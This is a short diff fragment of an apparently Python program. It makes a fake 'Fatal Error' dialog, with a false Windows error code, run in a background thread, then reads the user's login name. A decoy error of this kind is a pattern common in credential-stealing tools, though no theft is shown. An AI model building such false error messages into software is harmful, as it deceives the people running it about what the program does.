@@ -69,7 +69,7 @@ def error():
     messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
     
 if ERROR:
-    error()
+    error_t = threading.Thread(target=error).start()
 
 
 login = os.getlogin()
